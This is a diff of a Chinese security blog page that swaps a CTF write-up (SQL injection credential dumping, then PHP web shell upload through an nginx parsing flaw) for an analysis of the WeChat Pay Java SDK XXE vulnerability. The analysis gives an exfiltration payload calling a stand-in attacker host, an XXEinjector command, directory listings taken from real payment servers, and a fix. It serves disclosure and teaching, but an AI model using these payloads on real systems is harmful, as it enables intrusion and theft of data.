@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="php,ctf," />
+  <meta name="keywords" content="java,漏洞分析,xxe," />
 
 
 
@@ -79,30 +79,23 @@
 
 
 
-<meta name="description" content="前言  给学弟的moctf出了一题，结果部署是最麻烦的题目，期间换了三次环境，我们部署时候也遇到了很多坑，最早开始的初衷是想设计一个实际渗透的环境，然后其实要getshell用到的是nginx解析漏洞。200分的题目居然还有很多师傅没做出来，就如题目一样，信息收集的时候要认真呀。 解题思路  首先这题存在sql注入，并且没有设坑，并且是有回显的，所以对师傅们应该很友好。注入payload: htt">
-<meta name="keywords" content="php,ctf">
+<meta name="description" content="0x01 事件描述2018年7月2日，Rose Jackcode在packetstormsecurity披露WeChat Pay SDK XXE Injection漏洞。该漏洞产生位置位于微信的XML处理功能函数，微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果。该接口主体为提供了webservice接口服务，并且接受XML格式的数据，攻击者可以构造恶意的回调">
+<meta name="keywords" content="java,漏洞分析,xxe">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Happy-Moctf-要认真">
-<meta property="og:url" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/index.html">
+<meta property="og:title" content="微信支付SDK开发组件漏洞">
+<meta property="og:url" content="http://www.lmxspace.com/2018/07/03/微信支付SDK开发组件漏洞/index.html">
 <meta property="og:site_name" content="l1nk3r&#39;s blog">
-<meta property="og:description" content="前言  给学弟的moctf出了一题，结果部署是最麻烦的题目，期间换了三次环境，我们部署时候也遇到了很多坑，最早开始的初衷是想设计一个实际渗透的环境，然后其实要getshell用到的是nginx解析漏洞。200分的题目居然还有很多师傅没做出来，就如题目一样，信息收集的时候要认真呀。 解题思路  首先这题存在sql注入，并且没有设坑，并且是有回显的，所以对师傅们应该很友好。注入payload: htt">
+<meta property="og:description" content="0x01 事件描述2018年7月2日，Rose Jackcode在packetstormsecurity披露WeChat Pay SDK XXE Injection漏洞。该漏洞产生位置位于微信的XML处理功能函数，微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果。该接口主体为提供了webservice接口服务，并且接受XML格式的数据，攻击者可以构造恶意的回调">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/4.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/5.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/6.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/7.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/8.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/9.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/10.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/11.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/1.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/2.png">
-<meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/3.png">
-<meta property="og:updated_time" content="2018-03-06T13:09:03.037Z">
+<meta property="og:image" content="http://www.lmxspace.com/2018/07/03/微信支付SDK开发组件漏洞/1.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/07/03/微信支付SDK开发组件漏洞/2.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/07/03/微信支付SDK开发组件漏洞/3.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/07/03/微信支付SDK开发组件漏洞/4.png">
+<meta property="og:updated_time" content="2018-07-03T09:07:21.068Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Happy-Moctf-要认真">
-<meta name="twitter:description" content="前言  给学弟的moctf出了一题，结果部署是最麻烦的题目，期间换了三次环境，我们部署时候也遇到了很多坑，最早开始的初衷是想设计一个实际渗透的环境，然后其实要getshell用到的是nginx解析漏洞。200分的题目居然还有很多师傅没做出来，就如题目一样，信息收集的时候要认真呀。 解题思路  首先这题存在sql注入，并且没有设坑，并且是有回显的，所以对师傅们应该很友好。注入payload: htt">
-<meta name="twitter:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/4.png">
+<meta name="twitter:title" content="微信支付SDK开发组件漏洞">
+<meta name="twitter:description" content="0x01 事件描述2018年7月2日，Rose Jackcode在packetstormsecurity披露WeChat Pay SDK XXE Injection漏洞。该漏洞产生位置位于微信的XML处理功能函数，微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果。该接口主体为提供了webservice接口服务，并且接受XML格式的数据，攻击者可以构造恶意的回调">
+<meta name="twitter:image" content="http://www.lmxspace.com/2018/07/03/微信支付SDK开发组件漏洞/1.png">
 
 
 
@@ -132,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/"/>
+  <link rel="canonical" href="http://www.lmxspace.com/2018/07/03/微信支付SDK开发组件漏洞/"/>
 
 
 
 
 
-  <title>Happy-Moctf-要认真 | l1nk3r's blog</title>
+  <title>微信支付SDK开发组件漏洞 | l1nk3r's blog</title>
   
 
 
@@ -285,7 +278,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/">
+    <link itemprop="mainEntityOfPage" href="http://www.lmxspace.com/2018/07/03/微信支付SDK开发组件漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="l1nk3r">
@@ -302,7 +295,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Happy-Moctf-要认真</h1>
+          <h1 class="post-title" itemprop="name headline">微信支付SDK开发组件漏洞</h1>
         
 
         <div class="post-meta">
@@ -314,8 +307,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-14T20:42:13+08:00">
-                2018-02-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-03T17:04:10+08:00">
+                2018-07-03
               </time>
             
 
@@ -331,7 +324,7 @@
             
             
               &nbsp; | &nbsp;
-              <span id="/2018/02/14/Happy-Moctf-要认真/"class="leancloud_visitors" data-flag-title="Happy-Moctf-要认真">
+              <span id="/2018/07/03/微信支付SDK开发组件漏洞/"class="leancloud_visitors" data-flag-title="微信支付SDK开发组件漏洞">
               &nbsp;热度
               </span>
             
@@ -343,8 +336,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WriteUp/" itemprop="url" rel="index">
-                    <span itemprop="name">WriteUp</span>
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
                   </a>
                 </span>
 
@@ -360,7 +353,7 @@
 
           
           
-             <span id="/2018/02/14/Happy-Moctf-要认真/" class="leancloud_visitors" data-flag-title="Happy-Moctf-要认真">
+             <span id="/2018/07/03/微信支付SDK开发组件漏洞/" class="leancloud_visitors" data-flag-title="微信支付SDK开发组件漏洞">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -392,36 +385,29 @@
       
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  给学弟的moctf出了一题，结果部署是最麻烦的题目，期间换了三次环境，我们部署时候也遇到了很多坑，最早开始的初衷是想设计一个实际渗透的环境，然后其实要getshell用到的是nginx解析漏洞。200分的题目居然还有很多师傅没做出来，就如题目一样，信息收集的时候要认真呀。</p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>  首先这题存在sql注入，并且没有设坑，并且是有回显的，所以对师傅们应该很友好。注入payload:</p>
-<p><code>http://119.29.170.143:6003/show.php?id=-1%20union%20select%201,2,user(),4,5,6,7,8,9,10,database(),12,13,14,15</code></p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/4.png" alt="4"></p>
-<p>  这里如果师傅们回显手工注入的话，可能会发现报错，是因为注入姿势问题哟，这里我的payload用的是hex，不过师傅们为了方便也可以sqlmap，一样能出结果。</p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/5.png" alt="5"></p>
-<p>表名：</p>
-<p><code>http://119.29.170.143:6003/show.php?id=id=-1%20union%20select%201,2,group_concat(unhex(hex(table_name))),4,5,6,7,8,9,10,11,12,13,14,15%20from%20%20information_schema.tables%20where%20table_schema%20=0x636D73</code></p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/6.png" alt="6"></p>
-<p>列名：</p>
-<p><code>http://119.29.170.143:6003/show.php?id=-1%20union%20select%201,2,group_concat(unhex(hex(column_name))),4,5,6,7,8,9,10,11,12,13,14,15%20from%20%20information_schema.columns%20where%20table_schema%20=0x636D73</code></p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/7.png" alt="7"></p>
-<p>账号密码：</p>
-<p><code>http://119.29.170.143:6003/show.php?id=-1%20union%20select%201,2,group_concat(unhex(hex(username))),4,5,6,7,8,9,10,group_concat(unhex(hex(password))),12,13,14,15%20from%20cms_users</code></p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/8.png" alt="8"></p>
-<p>  密码md5解密后即可进入后台。</p>
-<p>  进入后台后发现文件上传点</p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/9.png" alt="9"></p>
-<p>  上传设置了白名单，无法直接上传php文件。通过burp信息收集，考虑到会不会是中间件解析漏洞，因此尝试上传带有php代码的图片文件。</p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/10.png" alt="10"></p>
-<p>  通过<code>http://119.29.170.143:6003/attachment/test.jpg/.php</code>成功执行php脚本。</p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/11.png" alt="11"></p>
-<p>  这里有个小坑，由于php版本问题<code>eval($_POST[x]); x=system(&#39;ls&#39;);</code>会报错，但是你可以变一下用<code>system($_POST[x]); x=ls</code>就好了。</p>
-<h1 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h1><p>  本地访问<code>http://127.0.0.1/test.jpg</code>时候报错，显示图片解析错误。我们访问<code>http://127.0.0.1/test.jpg/</code>的时候报404 notfound。</p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/1.png" alt="1"></p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/2.png" alt="2"></p>
-<p>&emsp;&emsp;其实这个漏洞与PHP版本和nginx版本都没关系，是配置文件的锅，这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。这里简单举个例子，当php遇到文件路径“/a.jpg/b.txt/c.php”时，若“/a.jpg/b.txt/c.php”不存在，则会去掉最后的“/c.php”，然后判断“/a.jpg/b.txt”是否存在，若存在，则把“/a.jpg/b.txt”当做文件“/a.jpg/b.txt/c.php”，若“/a.jpg/b.txt”仍不存在，则继续去掉“/b.txt”，以此类推。</p>
-<p><img src="/2018/02/14/Happy-Moctf-要认真/3.png" alt="3"></p>
-<p>  该选项在配置文件php.ini中。若是关闭该选项，访问 <code>http://127.0.0.1/test.jpg/test.php</code> 只会返回找不到文件。但关闭该选项很可能会导致一些其他错误，所以一般是开启的。</p>
-<p>  然而因为新版本的php引入了“security.limit_extensions”，限制了可执行文件的后缀，默认只允许执行.php文件，用来缓解这个问题.其次为什么说这个是nginx解析漏洞，而不是php的锅，我当初也有这个疑问，因为配置文件都在php上，和nginx没关系啊。翻了下几个常见的中间件的业务逻辑才明白了，因为Nginx在接收到url请求的时候，如果URL中路径名以.php结尾，它不会去自查本地是否存在这个文件，而是直接将这个url转发给php进行处理（IIS也有这个问题，配合PHP如果配置不当也是存在的）。而如Apache等，会根据文件是否存在做个判断，然后在做下一步动作。而cgi.fix_pathinfo是php独有的特性，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。</p>
+        <h1 id="0x01-事件描述"><a href="#0x01-事件描述" class="headerlink" title="0x01 事件描述"></a>0x01 事件描述</h1><p>2018年7月2日，Rose Jackcode在packetstormsecurity披露WeChat Pay SDK XXE Injection漏洞。该漏洞产生位置位于微信的XML处理功能函数，微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果。该接口主体为提供了webservice接口服务，并且接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何信息。</p>
+<p> 该漏洞可能导致商家服务器敏感信息（包括用户订单，用户私人数据等）泄露，甚至可以获取相关密钥数据（md5-key和merchant-id等）从而伪造支付数据包绕过付费环节。该批露文档中已经成功利用自动化工具读取了陌陌、vivo等互联网公司的数据信息。</p>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>安装包位置：<strong><a href="https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip" target="_blank" rel="noopener">https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</a></strong></p>
+<p>漏洞位置在： <strong>java-sdk-v3\src\main\java\com\github\wxpay\sdk\WXPayUtil.java</strong> , 第42行：</p>
+<p><img src="/2018/07/03/微信支付SDK开发组件漏洞/1.png" alt="1"></p>
+<p>这里很明显存在 <strong>xxe</strong> 漏洞，直接用 <strong>parse</strong> 解析传入的 <strong>xml</strong> 格式文本。</p>
+<p>在 <strong>readme.md</strong> 文件中，明确说明了这个方法是要起到什么作用。</p>
+<p><img src="/2018/07/03/微信支付SDK开发组件漏洞/2.png" alt="2"></p>
+<p>从功能来看，主要作用应该是用来接收支付结果，所以一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品）。</p>
+<p>当然不止是一个问题，从发现者的twitter来看，似乎还有个反序列化的问题。由于java的反序列化还不熟，回头出了新版本，对比一下补丁，再补吧，或者有大佬发现了，可以和我交流一下，邮箱联系啥联系都行，让我也学习学习。</p>
+<p><img src="/2018/07/03/微信支付SDK开发组件漏洞/3.png" alt="3"></p>
+<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % attack SYSTEM &quot;file:///etc/&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % xxe SYSTEM &quot;http://attacker:8080/shell/data.dtd&quot;;&gt;</span><br><span class="line">  %xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">data.dtd:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % shell &quot;&lt;!ENTITY % upload SYSTEM &apos;ftp://attack:33/%attack;</span><br><span class="line">&apos;&gt;&quot;&gt;</span><br><span class="line">%shell;</span><br><span class="line">%upload;</span><br><span class="line"></span><br><span class="line">or use  XXEinjector tool  【https://github.com/enjoiz/XXEinjector】</span><br><span class="line"></span><br><span class="line">ruby XXEinjector.rb --host=attacker --path=/etc   --file=req.txt --ssl</span><br><span class="line"></span><br><span class="line">req.txt :</span><br><span class="line">POST merchant_notification_url HTTP/1.1</span><br><span class="line">Host:  merchant_notification_url_host</span><br><span class="line">User-Agent: curl/7.43.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 57</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">XXEINJECT</span><br></pre></td></tr></table></figure>
+<h1 id="0x04-漏洞影响"><a href="#0x04-漏洞影响" class="headerlink" title="0x04 漏洞影响"></a>0x04 漏洞影响</h1><p>目前漏洞影响蛮大，最新版本仍然受影响，在github上找到部分之前的源代码，这个问题在2017年2月17日的时候就存在了，尚不清楚这个是不是腾讯官方sdk，但是腾讯的人应该跟进了。</p>
+<p><img src="/2018/07/03/微信支付SDK开发组件漏洞/4.png" alt="4"></p>
+<p>从披露来看，披露者已经攻击了陌陌和vivo，并获取了一些信息。</p>
+<p><strong>momo：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">attack:</span><br><span class="line">notify url:    https://pay.immomo.com/weixin/notify</span><br><span class="line">cmd:  /home/</span><br><span class="line"></span><br><span class="line"> result:</span><br><span class="line">    logs</span><br><span class="line">    zhang.jiax**</span><br><span class="line">    zhang.shaol**</span><br><span class="line">    zhang.xia**</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">attack:</span><br><span class="line">notify url:    https://pay.immomo.com/weixin/notify</span><br><span class="line">cmd:  /home/logs</span><br><span class="line"></span><br><span class="line">  result:</span><br><span class="line">     moa-service</span><br><span class="line">     momotrace</span><br></pre></td></tr></table></figure>
+<p><strong>Vivo:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">attack:</span><br><span class="line">notify url:   https://pay.vivo.com.cn/webpay/wechat/callback.oo</span><br><span class="line">cmd: /home/</span><br><span class="line"></span><br><span class="line">      result:</span><br><span class="line">		tomcat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack:</span><br><span class="line">notify url:   https://pay.vivo.com.cn/webpay/wechat/callback.oo</span><br><span class="line">cmd: /home/tomcat</span><br><span class="line"></span><br><span class="line">     result:</span><br><span class="line">		.bash_logout</span><br><span class="line">		.bash_profile</span><br><span class="line">		.bashrc</span><br><span class="line">		logs</span><br></pre></td></tr></table></figure>
+<h1 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h1><p>在\java-sdk-v3\src\main\java\com\github\wxpay\sdk\WXPayUtil.java, Line42之前添加如下Feature设置代码。（业务不影响的情况下选其一即可）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-general-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"> </span><br><span class="line">FEATURE = <span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">FEATURE = <span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;</span><br><span class="line">dbf.setFeature(FEATURE, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">dbf.setXIncludeAware(<span class="keyword">false</span>);</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a href="https://packetstormsecurity.com/files/148390/wechat-xxe.txt?utm_source=dlvr.it&amp;utm_medium=twitter&amp;from=groupmessage&amp;isappinstalled=0" target="_blank" rel="noopener">https://packetstormsecurity.com/files/148390/wechat-xxe.txt?utm_source=dlvr.it&amp;utm_medium=twitter&amp;from=groupmessage&amp;isappinstalled=0</a></p>
 
       
     </div>
@@ -439,9 +425,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
           
-            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+            <a href="/tags/漏洞分析/" rel="tag"><i class="fa fa-tag"></i> 漏洞分析</a>
+          
+            <a href="/tags/xxe/" rel="tag"><i class="fa fa-tag"></i> xxe</a>
           
         </div>
       
@@ -454,8 +442,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/01/22/一道ctf题的总结/" rel="next" title="一道ctf题的总结">
-                <i class="fa fa-chevron-left"></i> 一道ctf题的总结
+              <a href="/2018/06/23/phpmyadmin-4-8-1-复现分析/" rel="next" title="phpmyadmin-4.8.1-复现分析">
+                <i class="fa fa-chevron-left"></i> phpmyadmin-4.8.1-复现分析
               </a>
             
           </div>
@@ -463,10 +451,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/04/07/Win10bash了解一下/" rel="prev" title="Win10bash了解一下">
-                Win10bash了解一下 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -624,7 +608,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解题思路"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#知识总结"><span class="nav-text">知识总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-事件描述"><span class="nav-text">0x01 事件描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-漏洞分析"><span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-漏洞利用"><span class="nav-text">0x03 漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-漏洞影响"><span class="nav-text">0x04 漏洞影响</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-漏洞修复"><span class="nav-text">0x05 漏洞修复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-参考链接"><span class="nav-text">0x06 参考链接</span></a></li></ol></div>
             
 
           </div>
